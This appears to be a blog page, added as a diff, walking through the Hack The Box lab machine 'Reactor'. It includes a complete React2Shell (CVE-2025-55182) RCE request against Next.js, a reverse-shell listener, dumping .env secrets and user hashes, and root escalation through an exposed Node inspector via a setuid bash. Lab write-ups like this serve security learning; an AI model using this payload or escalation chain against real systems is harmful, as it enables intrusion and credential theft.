@@ -1,0 +1,654 @@
+<!DOCTYPE html><html lang="en-in"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Hackthebox Reactor Walkthrough - h4ck3rfirst</title><meta name="robots" content="noindex,nofollow"><meta name="generator" content="Publii Open-Source CMS for Static Site"><meta property="og:title" content="Hackthebox Reactor Walkthrough"><meta property="og:image" content="https://h4ck3rfirst.github.io/media/website/profile-2.png"><meta property="og:image:width" content="300"><meta property="og:image:height" content="300"><meta property="og:site_name" content="h4ck3rfirst"><meta property="og:description" content="Welcome to my writeup for Reactor, an easy-difficulty Linux machine on Hack The Box. This box provides a fantastic look&amp;hellip;"><meta property="og:url" content="https://h4ck3rfirst.github.io/hackthebox-reactor-walkthrough/"><meta property="og:type" content="article"><link rel="stylesheet" href="https://h4ck3rfirst.github.io/assets/css/style.css?v&#x3D;399b33d25e97aaafdf782ff626f536c4"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://h4ck3rfirst.github.io/hackthebox-reactor-walkthrough/"},"headline":"Hackthebox Reactor Walkthrough","datePublished":"2026-10-05T11:00+05:30","dateModified":"2026-10-07T11:00+05:30","image":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/website/profile-2.png","height":300,"width":300},"description":"Welcome to my writeup for Reactor, an easy-difficulty Linux machine on Hack The Box. This box provides a fantastic look&hellip;","author":{"@type":"Person","name":"h4ck3rfirst","url":"https://h4ck3rfirst.github.io/authors/h4ck3rfirst/"},"publisher":{"@type":"Organization","name":"h4ck3rfirst","logo":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/website/profile-2.png","height":300,"width":300}}}</script><noscript><style>img[loading] {
+                    opacity: 1;
+                }</style></noscript><style>@media (max-width: 600px) {
+    #publii-space-dust {
+        opacity: 0.85;
+    }
+}</style></head><body class="post-template"><div id="publii-space-dust" aria-hidden="true"><div id="publii-space-mouse-glow"></div></div><header class="top js-header"><a class="logo" href="https://h4ck3rfirst.github.io/"><img src="https://h4ck3rfirst.github.io/media/website/profile-2.png" alt="h4ck3rfirst" width="300" height="300"></a><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://h4ck3rfirst.github.io/" target="_self" rel="https://h4ck3rfirst.github.io/">Home</a></li><li><a href="https://h4ck3rfirst.github.io/tags/ctf-writeups/" target="_self">CTF/Labs</a></li><li><a href="https://h4ck3rfirst.github.io/tags/linux/" target="_self">Linux</a></li><li><a href="https://h4ck3rfirst.github.io/tags/windows/" target="_self">Windows</a></li><li><a href="https://h4ck3rfirst.github.io/tags/learning/" target="_self">Learning</a></li><li><a href="https://h4ck3rfirst.github.io/about-me/" target="_self">About me</a></li></ul></nav></header><main class="post"><article class="content"><div class="hero hero--noimage"><header class="hero__content"><div class="wrapper"><h1>Hackthebox Reactor Walkthrough</h1><div class="feed__meta content__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2026-10-05T11:00" class="feed__date">October 5, 2026</time></div></div></header></div><div class="entry-wrapper content__entry"><p>Welcome to my writeup for <strong>Reactor</strong>, an easy-difficulty Linux machine on Hack The Box. This box provides a fantastic look into modern web ecosystem vulnerabilities, data extraction, and subsequent pivot methodologies. We will move from unauthenticated Remote Code Execution (RCE) in a cutting-edge web framework to database cracking, culminating in a pivot to a system user shell.</p><h2 id="recon">Recon</h2><p>Every successful penetration test begins with gathering information about the target. We start by running an aggressive <strong>Nmap</strong> scan covering all ports to discover active services.</p><p>Lets starts with ports scanning with nmap</p><h3 id="nmap">nmap</h3><pre><code>└─$ nmap -A -min-rate=10000 -p- $vip
+
+Nmap scan report for 10.129.56.144
+Host is up (0.16s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
+|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
+3000/tcp open  ppp?
+| fingerprint-strings:
+|   GetRequest:
+|     HTTP/1.1 200 OK
+|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
+|     x-nextjs-cache: HIT
+|     x-nextjs-prerender: 1
+|     x-nextjs-stale-time: 4294967294
+|     X-Powered-By: Next.js
+|     Cache-Control: s-maxage=31536000,
+|     ETag: &quot;p02u6gnhufd8t&quot;
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 17175T
+|     Connection: close
+|     &lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;meta charSet=&quot;utf-8&quot;/&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;/&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/_next/static/css/414e1be982bc8557.css&quot; data-precedence=&quot;next&quot;/&gt;&lt;link rel=&quot;preload&quot; as=&quot;script&quot; fetchPriority=&quot;low&quot; href=&quot;/_next/static/chunks/webpack-db0a529a99835594.js&quot;/&gt;&lt;script src=&quot;/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js&quot; async=&quot;&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/_next/static/chunks/517-d083b552e04dead1.js&quot; async=&quot;&quot;&gt;&lt;/script&gt;&lt;script s
+|   HTTPOptions, RTSPRequest:
+|     HTTP/1.1 400 Bad Request
+|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
+|     Allow: GET
+|     Allow: HEAD
+|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
+|     Connection: close
+|   Help, NCP, RPCCheck:
+|     HTTP/1.1 400 Bad Request
+|_    Connection: close
+</code></pre><ul><li><strong>Port 22/tcp</strong>: Open - OpenSSH 9.6p1 (Ubuntu Linux)</li><li><strong>Port 3000/tcp</strong>: Open - Node.js environment running a <strong>Next.js</strong> application</li></ul><p>Port 22 gives us an entry point if we manage to acquire valid SSH credentials down the line. However, our primary target is <strong>Port 3000</strong>. The scan highlights HTTP fingerprint components unique to Next.js (<code>x-nextjs-cache</code>, <code>X-Powered-By: Next.js</code>). This confirms that an active web application is our immediate point of entry.</p><h2 id="enumeration">Enumeration</h2><h3 id="3000">3000</h3><p>We deep-dive into the application running on port 3000 using <strong>WhatWeb</strong> to fingerprint the technologies in use, and <strong>Nuclei</strong> to check for known vulnerabilities.</p><pre><code>└─$ whatweb  http://reactor.htb:3000/
+http://reactor.htb:3000/ [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.129.56.144], Script, Title[ReactorWatch | Core Monitoring System], UncommonHeaders[x-nextjs-cache,x-nextjs-prerender,x-nextjs-stale-time], X-Powered-By[Next.js]
+</code></pre><pre><code> nuclei -u http://reactor.htb:3000/
+
+[CVE-2025-55182] [http] [critical] http://reactor.htb:3000/
+[old-copyright] [http] [info] http://reactor.htb:3000/ [&quot;\u00a9 2025&quot;]
+</code></pre><p>Nuclei scan flags a critical finding: <strong>CVE-2025-55182</strong>.</p><p><strong>CVE-2025-55182</strong> (nicknamed <strong>“React2Shell”</strong>) is a maximum-severity (<strong>CVSS 10.0</strong>) unauthenticated remote code execution (RCE) vulnerability that affects the <strong>React Server Components (RSC)</strong> ecosystem and downstream frameworks like <strong>Next.js</strong></p><p>Using the blueprint provided by the React2Shell vulnerability, we intercept or construct a malicious <code>POST</code> request targeting the Next.js backend. We embed a Node.js payload inside the <code>_response</code> prefix object to execute <code>id</code> and capture its response inside the error digest.</p><pre><code>POST / HTTP/1.1
+Host: reactor.htb:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0
+Next-Action: x
+X-Nextjs-Request-Id: b5dce965
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
+X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
+Content-Length: 740
+
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name=&quot;0&quot;
+
+{
+  &quot;then&quot;: &quot;$1:__proto__:then&quot;,
+  &quot;status&quot;: &quot;resolved_model&quot;,
+  &quot;reason&quot;: -1,
+  &quot;value&quot;: &quot;{\&quot;then\&quot;:\&quot;$B1337\&quot;}&quot;,
+  &quot;_response&quot;: {
+    &quot;_prefix&quot;: &quot;var res=process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;,{&#39;timeout&#39;:5000}).toString().trim();;throw Object.assign(new Error(&#39;NEXT_REDIRECT&#39;), {digest:`${res}`});&quot;,
+    &quot;_chunks&quot;: &quot;$Q2&quot;,
+    &quot;_formData&quot;: {
+      &quot;get&quot;: &quot;$1:constructor:constructor&quot;
+    }
+  }
+}
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name=&quot;1&quot;
+
+&quot;$@0&quot;
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name=&quot;2&quot;
+
+[]
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
+</code></pre><p><strong>Success!</strong> The system evaluated our code and safely returned the output of the <code>id</code> command inside the <code>digest</code> block.</p><pre><code>HTTP/1.1 500 Internal Server Error
+Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
+Cache-Control: no-cache, no-store, max-age=0, must-revalidate
+x-nextjs-cache: HIT
+x-nextjs-prerender: 1
+X-Powered-By: Next.js
+Content-Type: text/x-component
+Connection: keep-alive
+Keep-Alive: timeout=5
+Content-Length: 110
+
+0:{&quot;a&quot;:&quot;$@1&quot;,&quot;f&quot;:&quot;&quot;,&quot;b&quot;:&quot;L3bimJe_3LvBcFWAnK5L4&quot;}
+1:E{&quot;digest&quot;:&quot;uid=999(node) gid=988(node) groups=988(node)&quot;}
+</code></pre><h3 id="rervese_shell-as">Rervese_shell as</h3><pre><code>└─$ rlwrap nc -lvnp 4444
+
+listening on [any] 4444 ...
+connect to [10.10.xx.xxx] from (UNKNOWN) [10.129.56.144] 48764
+bash: cannot set terminal process group (1413): Inappropriate ioctl for device
+bash: no job control in this shell
+node@reactor:/opt/reactor-app$
+</code></pre><p>Now that we have initial access, our goal shifts to pivoting or escalating privileges. We inspect the active working directory <code>/opt/reactor-app</code> to see what credentials or configurations are stored.</p><pre><code>node@reactor:/opt/reactor-app$ ls -lhas
+ls -lhas
+total 80K
+4.0K drwxr-xr-x  5 node node 4.0K Oct  6 17:56 .
+4.0K drwxr-xr-x  4 root root 4.0K Apr 27 11:26 ..
+4.0K drwxr-xr-x  2 node node 4.0K Dec 28  2025 app
+4.0K -rw-r--r--  1 node node  276 Dec 28  2025 .env
+4.0K drwxr-xr-x  7 node node 4.0K Dec 28  2025 .next
+4.0K -rw-r--r--  1 node node  172 Dec 28  2025 next.config.js
+4.0K drwxr-xr-x 30 node node 4.0K Dec 28  2025 node_modules
+4.0K -rw-r--r--  1 node node  269 Dec 28  2025 package.json
+ 32K -rw-r--r--  1 node node  29K Dec 28  2025 package-lock.json
+ 12K -rw-r-----  1 node node  12K Dec 28  2025 reactor.db
+4.0K -rw-r--r--  1 node node   55 Oct  6 17:56 rev.sh
+node@reactor:/opt/reactor-app$ cat .env
+cat .env
+# ReactorWatch Configuration
+# Database connection for sensor data
+
+DB_PATH=/opt/reactor-app/reactor.db
+DB_TYPE=sqlite3
+
+# API Keys
+SENSOR_API_KEY=rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k
+ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook
+
+# Node environment
+NODE_ENV=production
+node@reactor:/opt/reactor-app$
+</code></pre><p>Since the application uses a local <strong>SQLite3</strong> database, we can open it natively using the system’s pre-installed <code>sqlite3</code> binary to view the underlying database tables.</p><pre><code>node@reactor:/opt/reactor-app$ which sqlite3
+which sqlite3
+/usr/bin/sqlite3
+node@reactor:/opt/reactor-app$ sqlite3 reactor.db
+sqlite3 reactor.db
+.tables
+sensor_logs  users
+select * from users
+;
+1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
+2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
+</code></pre><figure class="post__image"><img loading="lazy" src="https://h4ck3rfirst.github.io/media/posts/44/Reactor_htb_md_cracking.png" alt="[Reactor_htb_md_cracking.png]" width="986" height="397" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://h4ck3rfirst.github.io/media/posts/44/responsive/Reactor_htb_md_cracking-xs.png 640w, https://h4ck3rfirst.github.io/media/posts/44/responsive/Reactor_htb_md_cracking-sm.png 768w, https://h4ck3rfirst.github.io/media/posts/44/responsive/Reactor_htb_md_cracking-md.png 1024w, https://h4ck3rfirst.github.io/media/posts/44/responsive/Reactor_htb_md_cracking-lg.png 1366w, https://h4ck3rfirst.github.io/media/posts/44/responsive/Reactor_htb_md_cracking-xl.png 1600w, https://h4ck3rfirst.github.io/media/posts/44/responsive/Reactor_htb_md_cracking-2xl.png 1920w"></figure><h3 id="shell-as-engineer">shell as engineer</h3><p>engineer : reactor1</p><pre><code>su engineer
+Password: reactor1
+id
+uid=1000(engineer) gid=1000(engineer) groups=1000(engineer),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd)
+</code></pre><pre><code>└─$ ssh engineer@reactor.htb
+The authenticity of host &#39;reactor.htb (10.129.56.144)&#39; can&#39;t be established.
+ED25519 key fingerprint is: SHA256:9v9mCPC4gn2EN/IbKKwhV8KZoNVTsVPorFhlTkNByPM
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;reactor.htb&#39; (ED25519) to the list of known hosts.
+engineer@reactor.htb&#39;s password:
+ ____  _____    _    ____ _____ ___  ____
+|  _ \| ____|  / \  / ___|_   _/ _ \|  _ \
+| |_) |  _|   / _ \| |     | || | | | |_) |
+|  _ &lt;| |___ / ___ \ |___  | || |_| |  _ &lt;
+|_| \_\_____/_/   \_\____| |_| \___/|_| \_\
+
+    ReactorWatch Core Monitoring System
+    Nuclear Dynamics Corp. - Site 7
+
+    AUTHORIZED PERSONNEL ONLY
+-bash: warning: setlocale: LC_ALL: cannot change locale (en_IN.UTF-8)
+Last login: Tue Oct 6 18:12:08 2026 from 10.10.16.32
+engineer@reactor:~$
+</code></pre><p>checking internal listening ports using <code>ss -tulp</code> revealed an even more direct configuration flaw running locally</p><pre><code>engineer@reactor:~$ ss -tulp
+Netid    State     Recv-Q    Send-Q       Local Address:Port          Peer Address:Port    Process
+udp      UNCONN    0         0               127.0.0.54:domain             0.0.0.0:*
+udp      UNCONN    0         0            127.0.0.53%lo:domain             0.0.0.0:*
+udp      UNCONN    0         0                  0.0.0.0:bootpc             0.0.0.0:*
+tcp      LISTEN    0         511              127.0.0.1:9229               0.0.0.0:*
+tcp      LISTEN    0         4096               0.0.0.0:ssh                0.0.0.0:*
+tcp      LISTEN    0         4096            127.0.0.54:domain             0.0.0.0:*
+tcp      LISTEN    0         4096         127.0.0.53%lo:domain             0.0.0.0:*
+tcp      LISTEN    0         4096                  [::]:ssh                   [::]:*
+tcp      LISTEN    0         511                      *:3000                     *:*
+</code></pre><p>The scan output shows a process listening exclusively on local loopback port <strong><code>9229</code></strong>. Inspecting the system process tree reveals exactly what is bound to it:</p><pre><code>engineer@reactor:/opt/uptime-monitor$ ps aux | grep worker.js
+ps aux | grep worker.js
+root        1415  0.0  1.1 1066804 47372 ?       Ssl  16:10   0:00 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
+engineer   60822  0.0  0.0   6680  2292 pts/2    S+   18:36   0:00 grep --color=auto worker.js
+engineer@reactor:/opt/uptime-monitor$
+</code></pre><p>port 9229 look interesting and The <code>worker.js</code> script is running as <strong><code>root</code> (PID 1415)</strong> and has been started with the <strong><code>--inspect=127.0.0.1:9229</code></strong> flag enabled.</p><pre><code>engineer@reactor:/opt/uptime-monitor$ ls -lhas
+ls -lhas
+total 12K
+4.0K drwxr-xr-x 2 root root 4.0K Apr 27 11:26 .
+4.0K drwxr-xr-x 4 root root 4.0K Apr 27 11:26 ..
+4.0K -rw-r--r-- 1 root root 1.7K Apr 27 11:26 worker.js
+</code></pre><pre><code>└─$ curl http://127.0.0.1:9229 -sv
+*   Trying 127.0.0.1:9229...
+* Established connection to 127.0.0.1 (127.0.0.1 port 9229) from 127.0.0.1 port 46220
+* using HTTP/1.x
+&gt; GET / HTTP/1.1
+&gt; Host: 127.0.0.1:9229
+&gt; User-Agent: curl/8.22.0
+&gt; Accept: */*
+&gt;
+* Request completely sent off
+* HTTP 1.0, assume close after body
+&lt; HTTP/1.0 400 Bad Request
+&lt; Content-Type: text/html; charset=UTF-8
+&lt;
+WebSockets request was expected
+* shutting down connection #0
+</code></pre><p>Misconfigured Node.js V8 Inspector</p><p>The background script <code>/opt/uptime-monitor/worker.js</code> is running as <strong><code>root</code></strong> but was executed with the dangerous <strong><code>--inspect=127.0.0.1:9229</code></strong> argument.</p><pre><code>
+└─$ node inspect 127.0.0.1:9229
+connecting to 127.0.0.1:9229 ... ok
+
+debug&gt; exec(&quot;require(&#39;child_process&#39;).execSync(&#39;cat /etc/shadow&#39;).toString()&quot;)
+ReferenceError: require is not defined
+    at &lt;anonymous&gt;:1:1
+debug&gt;
+debug&gt; exec(&quot;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;chmod +s /bin/bash&#39;)&quot;)
+Uint8Array(0)
+debug&gt; exec(&quot;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;chmod +s /bin/bash&#39;)&quot;)
+Uint8Array(0)
+</code></pre><p>Attempting to call <code>require(&#39;child_process&#39;)</code> drops a standard <code>ReferenceError: require is not defined</code> restriction.</p><p>the global Node environment tree directly to target the main running application module (<code>process.mainModule</code>), which retains access to the base module system</p><p>The server returns an empty byte array payload (<code>Uint8Array(0)</code>), verifying that the underlying operating system handled the <code>chmod</code> execution without throwing runtime execution errors.</p><h3 id="shell-as-root">shell as root</h3><p>The binary file attributes confirm success: the file permissions successfully changed to <code>-rwsr-sr-x</code>, meaning it is now an active SUID binary owned by root.</p><p>We run <code>bash</code> with the <code>-p</code> (privileged flag) argument to force the shell execution environment to respect its elevated Effective User ID (EUID) instead of throwing it away:</p><pre><code>engineer@reactor:/opt/uptime-monitor$ ls -lash /bin/bash
+ls -lash /bin/bash
+1.4M -rwsr-sr-x 1 root root 1.4M Mar 31  2024 /bin/bash
+engineer@reactor:/opt/uptime-monitor$ /bin/bash -p
+/bin/bash -p
+bash-5.2# id    id
+id
+uid=1000(engineer) gid=1000(engineer) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd),1000(engineer)
+</code></pre></div><footer class="content__footer"><div class="entry-wrapper"><p class="content__updated">This article was updated on October 7, 2026</p><div class="content__actions"><ul class="content__tag"><li><a href="https://h4ck3rfirst.github.io/tags/cracking/">cracking</a></li><li><a href="https://h4ck3rfirst.github.io/tags/cve-2025-55182/">cve-2025-55182</a></li><li><a href="https://h4ck3rfirst.github.io/tags/easy/">Easy</a></li><li><a href="https://h4ck3rfirst.github.io/tags/hackthebox/">hackthebox</a></li><li><a href="https://h4ck3rfirst.github.io/tags/node/">node</a></li><li><a href="https://h4ck3rfirst.github.io/tags/nodejs/">nodejs</a></li><li><a href="https://h4ck3rfirst.github.io/tags/react2shell/">React2Shell</a></li><li><a href="https://h4ck3rfirst.github.io/tags/reactorhtb/">Reactor.htb</a></li><li><a href="https://h4ck3rfirst.github.io/tags/sqlite/">sqlite</a></li></ul><div class="content__share"><button class="btn--icon content__share-button js-content__share-button"><svg width="20" height="20" aria-hidden="true"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#share"></use></svg> <span>Share It</span></button><div class="content__share-popup js-content__share-popup"><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-reactor-walkthrough%2F" class="js-share linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#linkedin"/></svg> <span>LinkedIn</span> </a><a href="https://buffer.com/add?text=Hackthebox%20Reactor%20Walkthrough&amp;url=https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-reactor-walkthrough%2F" class="js-share buffer" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#buffer"/></svg> <span>Buffer</span> </a><a href="https://api.whatsapp.com/send?text=Hackthebox%20Reactor%20Walkthrough https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-reactor-walkthrough%2F" class="js-share whatsapp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#whatsapp"/></svg> <span>WhatsApp</span></a></div></div></div><div class="content__bio bio"><div><h3 class="h4 bio__name"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" rel="author">h4ck3rfirst</a></h3></div></div></div><nav class="content__nav"><div class="wrapper"><div class="content__nav-inner"><div class="content__nav-prev"><a href="https://h4ck3rfirst.github.io/privilege-escalation-via-mysql-udf-exploitation/" class="content__nav-link" rel="prev"><div><span>Previous</span> Privilege Escalation via MySQL UDF Exploitation</div></a></div><div class="content__nav-next"><a href="https://h4ck3rfirst.github.io/google-dorking-for-bugbounty/" class="content__nav-link" rel="next"><div><span>Next</span> Google Dorking For Bugbounty</div></a></div></div></div></nav></footer></article><div class="content__related related"><div class="wrapper"><h2 class="h4 related__title">You should also read:</h2><article class="feed__item feed__item--centered"><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-03-02T18:36" class="feed__date">March 2, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/tryhackme-lookup-walkthrough/">Tryhackme Lookup Walkthrough</a></h3></header><p>tags: [ctf, enumeration, exploit, Lookup, writeups, htb, writeups, tryhackme, Linux, wordpress, cracking, walkthrough] Welcome to the walkthrough for the Lookup&hellip;</p></div></article><article class="feed__item feed__item--centered"><figure class="feed__image related__image"><img src="https://h4ck3rfirst.github.io/media/posts/12/soulmate.jpg" srcset="https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-xs.jpg 640w, https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-sm.jpg 768w, https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-md.jpg 1024w" sizes="(min-width: 600px) calc(4.38vw + 143px), 87.86vw" loading="lazy" height="300" width="300" alt=""></figure><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-09-11T23:23" class="feed__date">September 11, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/hackthebox-soulmate-walkthrough/">HackTheBox Soulmate Walkthrough</a></h3></header><p>Complete walkthrough of the HackTheBox Pentest Lab machine ‘Soulmate hackthebox HackTheBox — Soulmate Writeup Difficulty: Easy OS: Linux IP: 10.10.11.85&hellip;</p></div></article><article class="feed__item feed__item--centered"><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-09-21T18:18" class="feed__date">September 21, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/hackthebox-expressway-walkthrough/">HackTheBox Expressway Walkthrough</a></h3></header><p>Complete walkthrough of the HackTheBox Pentest Lab machine Expressway ┌──(kali㉿kali)-[/media/sf_shared/ctf/hackthebox/expressway] └─$ rustscan -a 10.10.11.87 .----. .-. .-. .----..---. .----. .---.</p></div></article></div></div></main><footer class="footer footer--glued"><div class="wrapper"><div class="footer__copyright"><h6>Documenting the world of bug bounties, pentesting, and security engineering one lab at a time.</h6><p class="align-center">© 2026 h4ck3rfirst . Built with 😊.</p></div><button id="backToTop" class="footer__bttop" aria-label="Back to top" title="Back to top"><svg width="20" height="20"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#toparrow"/></svg></button></div></footer><script defer="defer" src="https://h4ck3rfirst.github.io/assets/js/scripts.min.js?v&#x3D;dafec4f87fead6718cb125f0b0fc8441"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'sidebar',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
+        for (var i = 0; i < images.length; i++) {
+            if (images[i].complete) {
+                images[i].classList.add('is-loaded');
+            } else {
+                images[i].addEventListener('load', function () {
+                    this.classList.add('is-loaded');
+                }, false);
+            }
+        }</script><script>(function () {
+    "use strict";
+
+    const space = document.getElementById("publii-space-dust");
+
+    if (!space) return;
+
+    /* ================================
+       SETTINGS
+       ================================ */
+
+    const STAR_COUNT = 1200;
+
+    /*
+     * Approximately 2 cm on a typical desktop display.
+     * CSS pixels are not physically exact across monitors,
+     * so this is an approximate interaction radius.
+     */
+    const MOUSE_RADIUS = 75;
+
+    /* How fast the dust moves */
+    const MIN_SPEED = 0.99;
+    const MAX_SPEED = 2.99;
+
+    /* How often stars twinkle */
+    const MIN_TWINKLE = 0.9;
+    const MAX_TWINKLE = 2.8;
+
+    /* ================================
+       VARIABLES
+       ================================ */
+
+    const stars = [];
+    let mouseX = -9999;
+    let mouseY = -9999;
+    let animationFrame;
+
+    const glow = document.getElementById(
+        "publii-space-mouse-glow"
+    );
+
+    /* ================================
+       RANDOM HELPERS
+       ================================ */
+
+    function random(min, max) {
+        return Math.random() * (max - min) + min;
+    }
+
+    function clamp(value, min, max) {
+        return Math.max(min, Math.min(max, value));
+    }
+
+    /* ================================
+       CREATE STARS
+       ================================ */
+
+    for (let i = 0; i < STAR_COUNT; i++) {
+
+        const star = document.createElement("span");
+
+        star.className = "publii-star";
+
+        /*
+         * Most particles are tiny.
+         * A few are slightly larger.
+         */
+        const sizeChance = Math.random();
+
+        let size;
+
+        if (sizeChance > 0.992) {
+            size = random(3.0, 4.5);
+            star.classList.add("big");
+        } else if (sizeChance > 0.96) {
+            size = random(1.8, 3.2);
+        } else if (sizeChance > 0.82) {
+          // Normal stars
+    	size = random(1.0, 1.8);
+		} else {
+    	// Tiny space dust
+    	size = random(0.4, 1.1);
+		}
+
+        star.style.width = size + "px";
+        star.style.height = size + "px";
+
+        const x = Math.random() * window.innerWidth;
+        const y = Math.random() * window.innerHeight;
+
+        star.style.left = x + "px";
+        star.style.top = y + "px";
+
+        /*
+         * Each particle gets its own direction
+         * and speed so the background feels like dust.
+         */
+        const angle = random(0, Math.PI * 2);
+
+        const speed = random(
+            MIN_SPEED,
+            MAX_SPEED
+        );
+
+        /*
+         * Twinkle timing
+         */
+        const twinkleDuration = random(
+            MIN_TWINKLE,
+            MAX_TWINKLE
+        );
+
+        const twinkleDelay = random(
+            0,
+            MAX_TWINKLE
+        );
+
+        star.style.animation =
+            "publiiStarTwinkle " +
+            twinkleDuration +
+            "s ease-in-out " +
+            twinkleDelay +
+            "s infinite";
+
+        /*
+         * Store particle information.
+         */
+        stars.push({
+            element: star,
+
+            x: x,
+            y: y,
+
+            vx: Math.cos(angle) * speed,
+            vy: Math.sin(angle) * speed,
+
+            baseOpacity: random(0.25, 0.9),
+
+            size: size
+        });
+
+        space.appendChild(star);
+    }
+
+    /* ================================
+       ADD TWINKLE ANIMATION
+       ================================ */
+
+    const style = document.createElement("style");
+
+    style.textContent = `
+        @keyframes publiiStarTwinkle {
+            0%, 100% {
+                opacity: 0.08;
+            }
+
+            25% {
+                opacity: 0.35;
+            }
+
+            50% {
+                opacity: 1;
+            }
+
+            75% {
+                opacity: 0.4;
+            }
+        }
+    `;
+
+    document.head.appendChild(style);
+
+    /* ================================
+       MOUSE
+       ================================ */
+
+    window.addEventListener(
+        "mousemove",
+        function (event) {
+
+            mouseX = event.clientX;
+            mouseY = event.clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /*
+     * Remove mouse interaction when
+     * pointer leaves the browser window.
+     */
+    document.addEventListener(
+        "mouseleave",
+        function () {
+            mouseX = -9999;
+            mouseY = -9999;
+        }
+    );
+
+    /* ================================
+       TOUCH
+       ================================ */
+
+    window.addEventListener(
+        "touchmove",
+        function (event) {
+
+            if (!event.touches.length) return;
+
+            mouseX = event.touches[0].clientX;
+            mouseY = event.touches[0].clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /* ================================
+       ANIMATION
+       ================================ */
+
+    function animate() {
+
+        const width = window.innerWidth;
+        const height = window.innerHeight;
+
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
